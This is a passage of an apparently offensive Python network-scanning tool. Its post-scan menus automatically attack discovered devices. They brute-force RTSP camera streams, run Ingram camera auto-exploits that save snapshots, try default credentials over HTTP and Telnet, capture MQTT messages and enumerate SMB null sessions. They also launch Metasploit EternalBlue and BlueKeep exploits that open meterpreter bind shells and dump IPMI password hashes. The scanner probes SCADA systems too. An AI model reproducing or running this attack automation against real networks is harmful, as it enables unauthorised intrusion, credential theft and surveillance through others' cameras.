        # ── Phase 4: RTSP brute-force prompt ─────────────────────────────────
        rtsp_cameras = [
            r for r in results
            if r['device_type'] == 'Camera/CCTV'
            and any(p in set(RTSP_PORTS) for p in r.get('open_tcp', []))
        ]
        if rtsp_cameras:
            YELLOW = '\033[1;33m'
            RESET  = '\033[0m'
            print(f"\n{YELLOW}[!] Found {len(rtsp_cameras)} camera(s) with RTSP port open:{RESET}")
            for c in rtsp_cameras:
                pts = [p for p in c['open_tcp'] if p in set(RTSP_PORTS)]
                print(f"    {c['ip']:<16} {c['vendor'][:30]:<30}  RTSP ports: {pts}")
            try:
                ans = _input_tty("\n[?] Start RTSP credential brute-force? [y/N]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                ans = 'n'
            if ans == 'y':
                routes = os.path.join(SCRIPT_DIR, 'routes.txt')
                streams = rtsp_bruteforce(rtsp_cameras, routes_file=routes)
                if streams:
                    print(f"\n[+] {len(streams)} accessible stream(s) found:")
                    for s in streams:
                        print(f"    {s['url']}")
                    with open(self.output_file, 'a', encoding='utf-8') as f:
                        f.write("\n\n" + "=" * 76 + "\n")
                        f.write("  RTSP BRUTE-FORCE RESULTS\n")
                        f.write("=" * 76 + "\n")
                        for s in streams:
                            f.write(f"  OPEN  {s['url']}\n")
                        f.write("=" * 76 + "\n")
                else:
                    print("\n[-] No accessible RTSP streams found with tested credentials.")

        # ── Phase 5: per-device-type action submenus ─────────────────────────
        try:
            self._action_menus(results)
        except KeyboardInterrupt:
            pass

    # ── Per-device-type action submenus ──────────────────────────────────────

    def _action_menus(self, results: list):
        """
        Top-level navigation menu — user picks which section to visit and can
        return to this menu with 0 from any submenu.  Sections are only listed
        when the corresponding device type / port was actually detected.
        """
        CYAN   = '\033[1;36m'
        GREEN  = '\033[1;32m'
        YELLOW = '\033[1;33m'
        RED    = '\033[1;31m'
        BOLD   = '\033[1m'
        RESET  = '\033[0m'

        sys.stdout.write('\033[0m')
        sys.stdout.flush()
        try:
            with open('/dev/tty', 'w') as _t:
                _t.write('\033[0m')
        except Exception:
            pass

        def pick(prompt, options):
            """Show numbered options; return chosen key.  0/Enter → None (back)."""
            print()
            for k, label in options:
                print(f"  {BOLD}{k}{RESET}) {label}")
            print(f"  {BOLD}0{RESET}) Back")
            while True:
                try:
                    ans = _input_tty(f"{prompt}: ").strip()
                except (EOFError, KeyboardInterrupt):
                    return None
                if ans == '0' or ans == '':
                    return None
                for k, label in options:
                    if ans == k:
                        # Echo the selection so it's visible even when terminal
                        # echo races with tee output on the small phone screen.
                        print(f"  {CYAN}→ {label}{RESET}")
                        return k
                print("  Invalid — try again.")

        def _run_cmd(cmd, label, ip, timeout=60):
            """Run cmd with output redirected to /dev/tty.

            iot.sh pipes Python through tee, so inheriting fd 1 means the
            subprocess's ANSI colors and our reset code travel through the
            same tee buffer — but at different times.  Writing the reset to
            /dev/tty directly races with whatever tee still has buffered,
            leaving colored garbage on screen.

            Fix: open /dev/tty once, give it to subprocess for both stdout
            and stderr, then write \033[0m to the same fd before closing it.
            Because subprocess finishes before we write the reset, the order
            at the PTY is always: tool output → reset → next Python text.
            """
            print(f"\n{CYAN}[*] {label} → {ip}{RESET}")
            print(f"    cmd: {' '.join(str(x) for x in cmd)}")
            sys.stdout.flush()
            _tty = None
            try:
                _tty = open('/dev/tty', 'wb', buffering=0)
            except OSError:
                pass
            try:
                kw: dict = {'timeout': timeout}
                if _tty:
                    kw['stdout'] = _tty
                    kw['stderr'] = _tty
                subprocess.run(cmd, **kw)
            except subprocess.TimeoutExpired:
                print(f"  {YELLOW}[~] Timed out on {ip}{RESET}")
            except FileNotFoundError:
                print(f"  {RED}[!] Command not found: {cmd[0]}{RESET}")
            except Exception as e:
                print(f"  {RED}[!] Error: {e}{RESET}")
            finally:
                if _tty:
                    try: _tty.write(b'\033[0m')
                    except Exception: pass
                    try: _tty.close()
                    except Exception: pass
                sys.stdout.write('\033[0m')
                sys.stdout.flush()

        routes = os.path.join(SCRIPT_DIR, 'routes.txt')

        # Pre-compute all section lists once (used for nav menu counts too)
        cameras    = [r for r in results if r['device_type'] == 'Camera/CCTV']
        scada      = [r for r in results if r['device_type'] == 'SCADA/ICS']
        iot        = [r for r in results if r['device_type'] == 'IoT']
        printers   = [r for r in results if r['device_type'] == 'Printer']
        snmp_hosts = [r for r in results
                      if isinstance(r.get('probes', {}).get('snmp'), dict)]
        smb_hosts  = [r for r in results if 445  in r.get('open_tcp', [])]
        rdp_hosts  = [r for r in results if 3389 in r.get('open_tcp', [])]
        ipmi_hosts = [r for r in results
                      if isinstance(r.get('probes', {}).get('ipmi'), dict)
                      and r['probes']['ipmi'].get('alive')]
        docker_hosts = [r for r in results
                        if isinstance(r.get('probes', {}).get('docker'), dict)
                        and r['probes']['docker'].get('unauthenticated')]
        fox_hosts  = [r for r in results
                      if isinstance(r.get('probes', {}).get('fox'), dict)
                      and r['probes']['fox'].get('alive')]
        noauth_hosts    = [r for r in results
                           if isinstance(r.get('probes', {}).get('telnet_noauth'), dict)
                           and r['probes']['telnet_noauth'].get('no_auth')]
        cve24061_hosts  = [r for r in results
                           if isinstance(r.get('probes', {}).get('cve_24061'), dict)
                           and r['probes']['cve_24061'].get('vulnerable') is not False]
        mikrotik_hosts  = [r for r in results
                           if (isinstance(r.get('probes', {}).get('winbox'), dict)
                               and r['probes']['winbox'].get('alive'))
                           or 'mikrotik' in r.get('vendor', '').lower()]
        cisco_smi_hosts = [r for r in results
                           if isinstance(r.get('probes', {}).get('cisco_smi'), dict)
                           and r['probes']['cisco_smi'].get('alive')]
        nfs_hosts       = [r for r in results
                           if isinstance(r.get('probes', {}).get('nfs'), dict)
                           and r['probes']['nfs'].get('alive')]
        redis_hosts     = [r for r in results
                           if isinstance(r.get('probes', {}).get('redis'), dict)
                           and r['probes']['redis'].get('alive')]
        postgres_hosts  = [r for r in results
                           if isinstance(r.get('probes', {}).get('postgres'), dict)
                           and r['probes']['postgres'].get('alive')]
        ghostcat_hosts  = [r for r in results
                           if isinstance(r.get('probes', {}).get('ghostcat'), dict)
                           and r['probes']['ghostcat'].get('alive')]
        weblogic_hosts  = [r for r in results
                           if isinstance(r.get('probes', {}).get('weblogic'), dict)
                           and r['probes']['weblogic'].get('alive')]

        # Build top-level navigation — only include sections with findings
        nav_items = []
        if cameras:       nav_items.append(('1',  f'Camera/CCTV    — {len(cameras)} device(s)',              'cameras'))
        if scada:         nav_items.append(('2',  f'SCADA/ICS      — {len(scada)} device(s)',                'scada'))
        if iot:           nav_items.append(('3',  f'IoT devices    — {len(iot)} device(s)',                  'iot'))
        if snmp_hosts:    nav_items.append(('4',  f'SNMP           — {len(snmp_hosts)} responding',         'snmp'))
        if smb_hosts:     nav_items.append(('5',  f'Windows/SMB    — {len(smb_hosts)} with port 445',       'smb'))
        if rdp_hosts:     nav_items.append(('6',  f'RDP/BlueKeep   — {len(rdp_hosts)} with port 3389',      'rdp'))
        if ipmi_hosts:    nav_items.append(('7',  f'IPMI/BMC       — {len(ipmi_hosts)} BMC(s) found',       'ipmi'))
        if docker_hosts:  nav_items.append(('8',  f'Docker API     — {len(docker_hosts)} exposed daemon(s)', 'docker'))
        if fox_hosts:     nav_items.append(('9',  f'Niagara Fox    — {len(fox_hosts)} building system(s)',  'fox'))
        _telnet_combined = noauth_hosts or cve24061_hosts
        if _telnet_combined:
            _tl  = f'{len(noauth_hosts)} no-auth' if noauth_hosts else ''
            _tc  = f'{len(cve24061_hosts)} CVE-2026-24061' if cve24061_hosts else ''
            _tlabel = ' + '.join(x for x in [_tl, _tc] if x)
            nav_items.append(('10', f'Telnet Exploit  — {_tlabel}', 'telnet_noauth'))
        if mikrotik_hosts:nav_items.append(('11', f'MikroTik       — {len(mikrotik_hosts)} RouterOS device(s)',         'mikrotik'))
        if cisco_smi_hosts:nav_items.append(('12',f'Cisco SMI      — {len(cisco_smi_hosts)} Smart Install device(s)',   'cisco_smi'))
        if nfs_hosts:      nav_items.append(('13',f'NFS Shares     — {len(nfs_hosts)} host(s) with exports',            'nfs'))
        if redis_hosts:    nav_items.append(('14',f'Redis          — {len(redis_hosts)} instance(s) accessible',          'redis'))
        if postgres_hosts: nav_items.append(('15',f'PostgreSQL     — {len(postgres_hosts)} instance(s) accessible',       'postgres'))
        if ghostcat_hosts: nav_items.append(('16',f'Ghostcat AJP   — {len(ghostcat_hosts)} Tomcat AJP open (CVE-2020-1938)','ghostcat'))
        if weblogic_hosts: nav_items.append(('17',f'WebLogic       — {len(weblogic_hosts)} instance(s) (CVE-2019-2725)',   'weblogic'))
        if printers:       nav_items.append(('18',f'Printers       — {len(printers)} device(s) on port 9100/631',           'printers'))

        if not nav_items:
            return

        # ── Top-level navigation loop ─────────────────────────────────────────
        # User picks a section, runs it, then returns here.  0 = exit.
        while True:
            print(f"\n{RESET}{BOLD}{'─'*60}{RESET}")
            print(f"  {BOLD}POST-SCAN ACTIONS{RESET}")
            print(f"{BOLD}{'─'*60}{RESET}")
            for key, label, _ in nav_items:
                print(f"  {BOLD}{key}{RESET}) {label}")
            print(f"  {BOLD}0{RESET}) Exit")

            try:
                sect = _input_tty("\nSection: ").strip()
            except (EOFError, KeyboardInterrupt):
                break

            if sect == '0' or sect == '':
                break

            section = next((s[2] for s in nav_items if s[0] == sect), None)
            if not section:
                print("  Invalid — try again.")
                continue

            # ── Camera/CCTV ───────────────────────────────────────────────────
            if section == 'cameras':
                print(f"\n{RESET}{CYAN}{'─'*60}")
                print(f"  CAMERA / CCTV ACTIONS  ({len(cameras)} device(s))")
                print(f"{'─'*60}{RESET}")
                for c in cameras:
                    pts = sorted(c['open_tcp'])
                    print(f"  {c['ip']:<16} {c['vendor'][:28]:<28}  ports: {pts}")

                _ingram_ok = (
                    shutil.which('ingram') is not None
                    or shutil.which('python3') is not None
                    and __import__('importlib.util', fromlist=['find_spec']).find_spec('ingram') is not None
                )
                _ingram_label = (
                    'Ingram auto-exploit — snapshot + credential attack on all cameras'
                    if _ingram_ok else
                    'Ingram auto-exploit — [NOT INSTALLED: pip install Ingram]'
                )
                choice = pick(
                    "Camera action",
                    [
                        ('1', 'RTSP stream brute-force — try common credentials on port 554/8554'),
                        ('2', 'Show open ports + all probe results (HTTP banners, ONVIF, RTSP)'),
                        ('3', 'Query Hikvision/Dahua HTTP API — get model, firmware, serial number'),
                        ('4', 'HTTP default credential check — try admin/admin, admin/12345 etc. on web panel'),
                        ('5', _ingram_label),
                    ]
                )

                if choice == '1':
                    rtsp_cams = [c for c in cameras
                                 if any(p in set(RTSP_PORTS) for p in c.get('open_tcp', []))]
                    if not rtsp_cams:
                        print(f"{YELLOW}[~] No RTSP ports found — trying port 554 anyway{RESET}")
                        rtsp_cams = cameras
                    streams = rtsp_bruteforce(rtsp_cams, routes_file=routes)
                    if streams:
                        with open(self.output_file, 'a') as f:
                            f.write("\n\nRTSP BRUTE-FORCE (submenu)\n")
                            for s in streams:
                                f.write(f"  OPEN  {s['url']}\n")
                    else:
                        print(f"{RED}[-] No open streams found.{RESET}")

                elif choice == '2':
                    for c in cameras:
                        print(f"\n  {BOLD}{c['ip']}{RESET}  {c['vendor']}")
                        print(f"    TCP : {sorted(c['open_tcp'])}")
                        print(f"    UDP : {sorted(c['open_udp'])}")
                        for k, v in c.get('probes', {}).items():
                            print(f"    [{k.upper()}] {v}")

                elif choice == '3':
                    for c in cameras:
                        ip = c['ip']
                        print(f"\n  {BOLD}{ip}{RESET}")
                        for port in [80, 8080, 8000, 443]:
                            if port not in c.get('open_tcp', []):
                                continue
                            probe = self.prober.probe_http_fingerprint(ip, port)
                            if probe:
                                print(f"    HTTP:{port} → {probe}")
                            onvif = self.prober.probe_onvif(ip, port)
                            if onvif:
                                print(f"    ONVIF:{port} → {onvif}")
                            break

                elif choice == '4':
                    print(f"\n{YELLOW}[*] Trying HTTP Basic auth default creds...{RESET}")
                    for c in cameras:
                        ip = c['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET}")
                        for port in [80, 8080, 8000, 8888, 443]:
                            if port not in c.get('open_tcp', []):
                                continue
                            cred_result = self.prober.probe_http_creds(ip, port)
                            if cred_result:
                                print(f"    {GREEN}[+] VALID CREDS on port {port}: "
                                      f"{cred_result['username']} / {cred_result['password']}{RESET}")
                                print(f"        Response: {cred_result['response']}")
                                with open(self.output_file, 'a') as fh:
                                    fh.write(f"\nHTTP-CREDS  {ip}:{port}  "
                                             f"{cred_result['username']}:{cred_result['password']}\n")
                            else:
                                print(f"    [-] No default creds worked on port {port}")
                            break

                elif choice == '5':
                    import importlib.util as _ilu, tempfile as _tmp
                    _has_pkg  = _ilu.find_spec('ingram') is not None
                    _has_cmd  = shutil.which('ingram') is not None

                    if not _has_pkg and not _has_cmd:
                        print(f"\n  {RED}[!] Ingram is not installed.{RESET}")
                        print(f"  {YELLOW}    Install: pip install Ingram{RESET}")
                        print(f"  {YELLOW}    Or:      pip install Ingram --break-system-packages{RESET}")
                    else:
                        # Write discovered camera IPs to a temp file
                        with _tmp.NamedTemporaryFile(
                            mode='w', suffix='.txt', delete=False, prefix='fsec_ingram_'
                        ) as _tf:
                            for c in cameras:
                                _tf.write(c['ip'] + '\n')
                            _ip_file = _tf.name

                        _out_dir = os.path.join(
                            os.path.dirname(self.output_file), 'ingram_out'
                        )
                        os.makedirs(_out_dir, exist_ok=True)

                        print(f"\n  {CYAN}[*] Ingram — targeting {len(cameras)} camera(s){RESET}")
                        print(f"  {CYAN}[*] Targets : {_ip_file}{RESET}")
                        print(f"  {CYAN}[*] Output  : {_out_dir}{RESET}\n")

                        if _has_cmd:
                            _cmd = ['ingram', '--in', _ip_file, '--out', _out_dir]
                        else:
                            _cmd = ['python3', '-m', 'ingram', '--in', _ip_file, '--out', _out_dir]

                        _run_cmd(_cmd, 'Ingram auto-exploit', 'camera(s)', timeout=300)

                        try:
                            os.unlink(_ip_file)
                        except OSError:
                            pass

                        # Append ingram output summary to main report
                        _snap_dir = os.path.join(_out_dir, 'snapshots')
                        _snaps = []
                        if os.path.isdir(_snap_dir):
                            _snaps = [f for f in os.listdir(_snap_dir)
                                      if f.endswith(('.jpg', '.jpeg', '.png'))]
                        with open(self.output_file, 'a') as _fh:
                            _fh.write(f"\n\nINGRAM  output={_out_dir}"
                                      f"  snapshots={len(_snaps)}\n")
                        if _snaps:
                            print(f"\n  {GREEN}[✔] {len(_snaps)} snapshot(s) saved → {_snap_dir}{RESET}")

            # ── SCADA/ICS ─────────────────────────────────────────────────────
            elif section == 'scada':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  SCADA / ICS ACTIONS  ({len(scada)} device(s))")
                print(f"{'─'*60}{RESET}")
                for d in scada:
                    pts = sorted(d['open_tcp'])
                    print(f"  {d['ip']:<16} {d['vendor'][:28]:<28}  ports: {pts}")

                choice = pick(
                    "SCADA action",
                    [
                        ('1', 'Re-probe industrial protocols — Modbus/TCP, Siemens S7, EtherNet/IP, BACnet, DNP3'),
                        ('2', 'Show full probe results — device ID, registers, protocol responses'),
                        ('3', 'SNMP query — sysDescr, sysName, sysLocation (tries public/private/admin/read)'),
                    ]
                )

                if choice == '1':
                    for d in scada:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET} re-probing ...")
                        probes = self.prober.run_probes(
                            ip, set(d['open_tcp']), set(d['open_udp']),
                            'SCADA/ICS', workers=self.probe_workers
                        )
                        for k, v in probes.items():
                            print(f"    [{k.upper()}] {v}")

                elif choice == '2':
                    for d in scada:
                        print(f"\n  {BOLD}{d['ip']}{RESET}  {d['vendor']}")
                        for k, v in d.get('probes', {}).items():
                            print(f"    [{k.upper()}] {v}")

                elif choice == '3':
                    for d in scada:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET} SNMP ...")
                        for community in ('public', 'private', 'admin', 'read'):
                            snmp_result = self.prober.probe_snmp(ip, community)
                            if snmp_result:
                                print(f"    community={community!r}")
                                for k, v in snmp_result.items():
                                    if k not in ('protocol', 'port', 'community'):
                                        print(f"      {k}: {v}")
                                break

            # ── IoT ───────────────────────────────────────────────────────────
            elif section == 'iot':
                print(f"\n{RESET}{GREEN}{'─'*60}")
                print(f"  IoT DEVICE ACTIONS  ({len(iot)} device(s))")
                print(f"{'─'*60}{RESET}")
                for d in iot:
                    pts = sorted(d['open_tcp'])
                    print(f"  {d['ip']:<16} {d['vendor'][:28]:<28}  ports: {pts}")

                choice = pick(
                    "IoT action",
                    [
                        ('1', 'MQTT broker check — connect, subscribe to all topics (#), capture messages for 10s'),
                        ('2', 'UPnP/SSDP info — fetch device description XML (model, manufacturer, service URLs)'),
                        ('3', 'Show full probe results — HTTP banners, SSH info, SNMP, MQTT, UPnP details'),
                        ('4', 'FTP anon login + Telnet default creds (admin/admin, root/root, admin/1234 ...)'),
                    ]
                )

                if choice == '1':
                    mqtt_devices = [d for d in iot
                                    if 1883 in d['open_tcp'] or 8883 in d['open_tcp']]
                    if not mqtt_devices:
                        print(f"\n  {YELLOW}[~] No IoT devices with MQTT port (1883/8883) found "
                              f"in this scan.{RESET}")
                    else:
                        for d in mqtt_devices:
                            ip = d['ip']
                            print(f"\n  {BOLD}[{ip}]{RESET}")
                            for port in (1883, 8883):
                                if port not in d['open_tcp']:
                                    continue
                                try:
                                    probe = self.prober.probe_mqtt(ip, port)
                                    print(f"    MQTT:{port} → {probe}")
                                    if isinstance(probe, dict) and probe.get('open_broker'):
                                        print(f"    {GREEN}[+] Open broker! Capturing 10s...{RESET}")
                                        msgs = mqtt_capture(ip, port, duration=10)
                                        if msgs:
                                            print(f"    {GREEN}[+] {len(msgs)} message(s){RESET}")
                                            with open(self.output_file, 'a') as fh:
                                                fh.write(f"\nMQTT-CAPTURE  {ip}:{port}\n")
                                                for m in msgs:
                                                    fh.write(f"  {m['topic']}: {m['payload']}\n")
                                        else:
                                            print(f"    [-] No messages in 10s")
                                except Exception as e:
                                    print(f"    {RED}[!] MQTT error on {ip}:{port} — {e}{RESET}")

                elif choice == '2':
                    for d in iot:
                        ip = d['ip']
                        r = self.prober.probe_upnp(ip)
                        if r:
                            print(f"\n  {BOLD}[{ip}]{RESET} UPnP: {r}")

                elif choice == '3':
                    for d in iot:
                        print(f"\n  {BOLD}{d['ip']}{RESET}  {d['vendor']}")
                        for k, v in d.get('probes', {}).items():
                            print(f"    [{k.upper()}] {v}")

                elif choice == '4':
                    for d in iot:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET}")
                        if 21 in d['open_tcp']:
                            r = self.prober.probe_ftp_anon(ip)
                            if r and r.get('anonymous'):
                                print(f"    {GREEN}[+] FTP anon SUCCESS!{RESET}  {r.get('banner', '')[:80]}")
                            elif r:
                                print(f"    [-] FTP anon blocked.  Banner: {r.get('banner', '')[:80]}")
                        if 23 in d['open_tcp']:
                            r = self.prober.probe_telnet_creds(ip)
                            if r:
                                print(f"    {GREEN}[+] Telnet: {r['username']} / {r['password']}{RESET}")
                            else:
                                print(f"    [-] Telnet: no default creds worked")

            # ── SNMP ──────────────────────────────────────────────────────────
            elif section == 'snmp':
                print(f"\n{RESET}{YELLOW}{'─'*60}")
                print(f"  SNMP ACTIONS  ({len(snmp_hosts)} device(s) responding to SNMP)")
                print(f"{'─'*60}{RESET}")
                for d in snmp_hosts:
                    snmp_d = d['probes']['snmp']
                    comm   = snmp_d.get('community', '?')
                    hint   = (snmp_d.get('sysName') or snmp_d.get('sysDescr') or '')[:40]
                    print(f"  {d['ip']:<16} community={comm!r:<10}  {hint}")

                # Detect available SNMP dump tool; check Term::ReadKey for snmpcheck
                _snmp_tool = shutil.which('snmp-check') or shutil.which('snmpcheck')
                _snmpwalk  = shutil.which('snmpwalk')
                _use_walk  = False

                if _snmp_tool:
                    try:
                        r = subprocess.run(
                            ['perl', '-e', 'use Term::ReadKey'],
                            capture_output=True, timeout=3
                        )
                        if r.returncode != 0:
                            print(f"\n  {YELLOW}[~] snmpcheck requires Term::ReadKey (missing).{RESET}")
                            print(f"      Fix: {BOLD}apt install libterm-readkey-perl{RESET}")
                            _snmp_tool = None
                    except Exception:
                        _snmp_tool = None

                if not _snmp_tool and _snmpwalk:
                    _use_walk = True

                snmp_opts = [('1', 'Show captured SNMP data — sysDescr, sysName, sysLocation, sysContact')]
                if _snmp_tool:
                    snmp_opts.append(('2', 'Full SNMP dump via snmp-check — interfaces, routes, users, processes, shares'))
                elif _use_walk:
                    snmp_opts.append(('2', 'Full OID dump via snmpwalk — walk all MIBs (-v2c, community from scan)'))
                else:
                    print(f"\n  {YELLOW}[~] No SNMP dump tool found.{RESET}")
                    print(f"      Install: {BOLD}apt install snmp libterm-readkey-perl{RESET}")

                choice = pick("SNMP action", snmp_opts)

                if choice == '1':
                    for d in snmp_hosts:
                        ip     = d['ip']
                        snmp_d = d['probes']['snmp']
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        for k, v in snmp_d.items():
                            if k not in ('protocol', 'port'):
                                print(f"    {k}: {v}")

                elif choice == '2':
                    for d in snmp_hosts:
                        ip   = d['ip']
                        comm = d['probes']['snmp'].get('community', 'public')
                        if _snmp_tool:
                            tool_cmd = [_snmp_tool, '-c', comm, '-v', '2c', ip]
                            tool_label = 'snmp-check full dump'
                        else:
                            tool_cmd = [_snmpwalk, '-v2c', '-c', comm, ip]
                            tool_label = 'snmpwalk OID dump'
                        _run_cmd(tool_cmd, tool_label, ip, timeout=90)
                        try:
                            dump = subprocess.run(
                                tool_cmd, capture_output=True, text=True, timeout=90
                            ).stdout
                            if dump:
                                with open(self.output_file, 'a', encoding='utf-8') as fh:
                                    fh.write(f"\n{tool_label.upper()}  {ip}  community={comm}\n")
                                    fh.write(dump)
                                    fh.write("\n")
                        except Exception:
                            pass

            # ── Windows/SMB ───────────────────────────────────────────────────
            elif section == 'smb':
                print(f"\n{RESET}{BOLD}{'─'*60}")
                print(f"  WINDOWS / SMB ACTIONS  ({len(smb_hosts)} device(s) with port 445)")
                print(f"{'─'*60}{RESET}")
                for d in smb_hosts:
                    smb_info = d.get('probes', {}).get('smb', {})
                    ver  = smb_info.get('smb_version', '?') if isinstance(smb_info, dict) else '?'
                    sign = smb_info.get('signing', '?')    if isinstance(smb_info, dict) else '?'
                    print(f"  {d['ip']:<16} {d['vendor'][:26]:<26}  {ver}  signing={sign}")

                smb1_hosts = [
                    d for d in smb_hosts
                    if 'smb1' in str(
                        d.get('probes', {}).get('smb', {}).get('smb_version', '')
                    ).lower()
                ]

                cme = shutil.which('crackmapexec') or shutil.which('cme')
                if not cme:
                    print(f"\n{YELLOW}[~] crackmapexec not found — install: pip install crackmapexec{RESET}")
                else:
                    smb_opts = [
                        ('1', 'Null session — list accessible shares (no credentials needed)'),
                        ('2', 'Full null session enum — users, groups, shares, RID brute-force'),
                    ]
                    if smb1_hosts:
                        n = len(smb1_hosts)
                        smb_opts += [
                            ('3', f'EternalBlue/MS17-010 check — scan {n} SMBv1 host(s) for CVE-2017-0144'),
                            ('4', f'Enum + EternalBlue check — null session + MS17-010 scan [{n} SMBv1 host(s)]'),
                            ('5', f'EternalBlue exploit — RCE bind shell port 4444 [{n} SMBv1 host(s)] (Metasploit)'),
                        ]
                    else:
                        print(f"  {YELLOW}[~] No SMBv1 hosts — EternalBlue options hidden{RESET}")

                    choice = pick("SMB action", smb_opts)

                    def _cme(args_list, label, hosts=None):
                        for d in (hosts if hosts is not None else smb_hosts):
                            _run_cmd([cme, 'smb', d['ip']] + args_list, label, d['ip'], timeout=30)

                    if choice == '1':
                        _cme(['-u', '', '-p', '', '--shares'], 'CME null session shares')

                    elif choice == '2':
                        _cme(['-u', '', '-p', '', '--shares', '--users',
                              '--groups', '--rid-brute'], 'CME null session full enum')

                    elif choice == '3':
                        _cme(['-u', '', '-p', '', '-M', 'ms17-010'],
                             'CME MS17-010 check', hosts=smb1_hosts)

                    elif choice == '4':
                        _cme(['-u', '', '-p', '', '--shares'], 'CME null session shares')
                        _cme(['-u', '', '-p', '', '--users', '--groups'], 'CME user/group enum')
                        _cme(['-u', '', '-p', '', '-M', 'ms17-010'],
                             'CME MS17-010 check', hosts=smb1_hosts)

                    elif choice == '5':
                        msf = shutil.which('msfconsole')
                        if not msf:
                            print(f"\n{YELLOW}[~] msfconsole not found — install Metasploit{RESET}")
                        else:
                            for d in smb1_hosts:
                                ip = d['ip']
                                msf_cmds = (
                                    f"use exploit/windows/smb/ms17_010_eternalblue; "
                                    f"set RHOSTS {ip}; set RPORT 445; "
                                    f"set payload windows/x64/meterpreter/bind_tcp; "
                                    f"set LPORT 4444; run"
                                )
                                _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                         'MS17-010 EternalBlue exploit bind_tcp:4444',
                                         ip, timeout=None)

            # ── RDP/BlueKeep ──────────────────────────────────────────────────
            elif section == 'rdp':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  RDP / BLUEKEEP ACTIONS  ({len(rdp_hosts)} device(s) with port 3389)")
                print(f"{'─'*60}{RESET}")
                for d in rdp_hosts:
                    os_str = d.get('os', 'Unknown')[:28]
                    print(f"  {d['ip']:<16} {d['vendor'][:24]:<24}  OS: {os_str}")

                _bk_safe = ['windows 8', 'windows 10', 'windows 11',
                            'server 2012', 'server 2016', 'server 2019', 'server 2022']
                bk_hosts = [
                    d for d in rdp_hosts
                    if not any(kw in d.get('os', '').lower() for kw in _bk_safe)
                ]

                rdp_opts = [('3', 'RDP security scan — detect NLA/encryption/auth level (nmap rdp-enum-encryption)')]
                if bk_hosts:
                    n = len(bk_hosts)
                    rdp_opts = [
                        ('1', f'BlueKeep check — CVE-2019-0708 scan [{n} pre-Win10 candidate(s)] (Metasploit)'),
                        ('2', f'BlueKeep exploit — unauthenticated RCE bind shell port 4444 [{n} candidate(s)]'),
                    ] + rdp_opts
                else:
                    print(f"  {YELLOW}[~] OS not vulnerable to BlueKeep — options hidden{RESET}")

                choice = pick("RDP action", rdp_opts)

                if choice in ('1', '2'):
                    msf = shutil.which('msfconsole')
                    if not msf:
                        print(f"\n{YELLOW}[~] msfconsole not found — install Metasploit{RESET}")
                    else:
                        for d in bk_hosts:
                            ip = d['ip']
                            if choice == '1':
                                msf_cmds = (
                                    f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; "
                                    f"set RHOSTS {ip}; set RPORT 3389; "
                                    f"check; exit"
                                )
                                _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                         'BlueKeep check (CVE-2019-0708)', ip, timeout=120)
                            elif choice == '2':
                                msf_cmds = (
                                    f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; "
                                    f"set RHOSTS {ip}; set RPORT 3389; "
                                    f"set payload windows/x64/meterpreter/bind_tcp; "
                                    f"set LPORT 4444; set TARGET 0; run"
                                )
                                _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                         'BlueKeep exploit bind_tcp:4444', ip, timeout=None)

                elif choice == '3':
                    for d in rdp_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '3389',
                             '--script', 'rdp-enum-encryption', ip],
                            'nmap rdp-enum-encryption', ip, timeout=60
                        )

            # ── IPMI/BMC ─────────────────────────────────────────────────────
            elif section == 'ipmi':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  IPMI / BMC ACTIONS  ({len(ipmi_hosts)} device(s))")
                print(f"{'─'*60}{RESET}")
                for d in ipmi_hosts:
                    ipmi_d = d['probes']['ipmi']
                    c0     = ipmi_d.get('cipher0', False)
                    auths  = ipmi_d.get('auth_types', '?')
                    flag   = f"{RED}[CIPHER-0]{RESET}" if c0 else ''
                    print(f"  {d['ip']:<16} {d['vendor'][:24]:<24}  auth={auths}  {flag}")

                choice = pick(
                    "IPMI action",
                    [
                        ('1', 'Show IPMI probe data — auth types, cipher-0 status'),
                        ('2', 'Metasploit IPMI hash dump — CVE-2013-4786 (ipmi_dumphashes)'),
                        ('3', 'Metasploit IPMI default credentials check (ipmi_login)'),
                    ]
                )

                if choice == '1':
                    for d in ipmi_hosts:
                        ip     = d['ip']
                        ipmi_d = d['probes']['ipmi']
                        c0     = ipmi_d.get('cipher0', False)
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        print(f"    Auth types : {ipmi_d.get('auth_types', '?')}")
                        c0_str = f"{RED}YES — anonymous hash extraction possible{RESET}" if c0 else 'No'
                        print(f"    Cipher-0   : {c0_str}")
                        if c0:
                            print(f"    {YELLOW}[!] use auxiliary/scanner/ipmi/ipmi_dumphashes{RESET}")

                elif choice in ('2', '3'):
                    msf = shutil.which('msfconsole')
                    if not msf:
                        print(f"\n{YELLOW}[~] msfconsole not found — install Metasploit{RESET}")
                    else:
                        if choice == '2':
                            c0_targets = [d for d in ipmi_hosts
                                          if d['probes']['ipmi'].get('cipher0')]
                            if not c0_targets:
                                print(f"  {YELLOW}[~] No cipher-0 vulnerable BMCs found.{RESET}")
                                c0_targets = ipmi_hosts  # try anyway
                            targets = c0_targets
                        else:
                            targets = ipmi_hosts
                        for d in targets:
                            ip = d['ip']
                            if choice == '2':
                                msf_cmds = (
                                    f"use auxiliary/scanner/ipmi/ipmi_dumphashes; "
                                    f"set RHOSTS {ip}; set RPORT 623; "
                                    f"set CRACK_COMMON true; run; exit"
                                )
                                _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                         'IPMI hash dump (CVE-2013-4786)', ip, timeout=120)
                            else:
                                msf_cmds = (
                                    f"use auxiliary/scanner/ipmi/ipmi_login; "
                                    f"set RHOSTS {ip}; set RPORT 623; run; exit"
                                )
                                _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                         'IPMI default credentials', ip, timeout=120)

            # ── Docker API ────────────────────────────────────────────────────
